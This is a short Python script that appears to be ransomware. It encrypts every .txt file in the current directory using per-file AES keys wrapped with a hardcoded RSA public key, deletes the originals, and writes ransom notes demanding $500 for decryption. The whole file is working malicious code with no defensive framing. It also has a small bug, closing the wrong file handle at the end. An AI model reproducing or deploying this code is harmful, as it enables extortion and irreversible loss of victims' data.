from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad
from base64 import *
import os

## Hardcoded public key
hardcoded_key = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwso9Fyb5gkO73dh3BdLyEL3DcOIoPVlXI2ntyIfYOkzoQWWi8Z98rBznNGRc8K1kzqNbZRek+p6pdTo6+3j+JuZwZQ02YaQl5+TXpXF7CnG7kF4gUvrQRcRo4b90JURSrcYDU5XLtAD1g7VYtntN3LKKIRk+eovVCuSutH4sk7mR1tD1HNYLDbKrBtcWIpQlXCnRV07nRI4PQdno4W+ZZgFewD6cMCScDKBYN/Q1Y/cUs8xAGbx9WCKAEKJW2YgfQjndimz805n3A2L9cE3MvA7gtXBLedOtJnt9GJmTAdaoN35nWxnK86DEwc9ZPxoxcJMqKVxMgEW62t1jKDJImQIDAQAB\n-----END PUBLIC KEY-----"

## Put key in readable format by RSA encryption object
recipient_key = RSA.import_key(hardcoded_key)

## Get CWD and create list to store .txt filenames
cwd = os.getcwd()
txtFiles = []

## Append all .txt filenames to txtFiles list
for f in os.listdir(cwd):
    if f.endswith(".txt"):
        txtFiles.append(f)

## Encrypt all .txt files in current directory
for f in txtFiles:
    file_in = open(f, 'rb')
    file_data = file_in.read()
    file_in.close()

    ## Create unique key for each file
    session_key = get_random_bytes(16)

    ## Encrypt each unique key using public RSA key
    cipher_rsa = PKCS1_OAEP.new(recipient_key)
    enc_session_key = cipher_rsa.encrypt(session_key)

    ## Encrypt file data using unique key
    cipher_aes = AES.new(session_key, AES.MODE_CBC)
    ciphertext = cipher_aes.encrypt(pad(file_data, AES.block_size))
    file_out = open(f"{f}.encrypted", "wb")
    file_out.write(cipher_aes.iv)
    file_out.write(ciphertext)
    file_out.close()

    ## Remove plaintext file from user's directory
    os.remove(f)

    ## Create ransom note for each file for the user to read. Should hold unique identifier for decryption
    file_note = open(f"{f}.note", "wb")
    file_note.write(b"This file has been encrypted. Please provide the following unique identifier with a payment of $500 to my email in order to get your file back.\n\n")
    file_note.write(b64encode(enc_session_key))
    file_note.close()

    ## Create file to hold unique ID for decryption
    file_ID = open(f"{f}.ID", "wb")
    file_ID.write(b64encode(enc_session_key))
    file_note.close()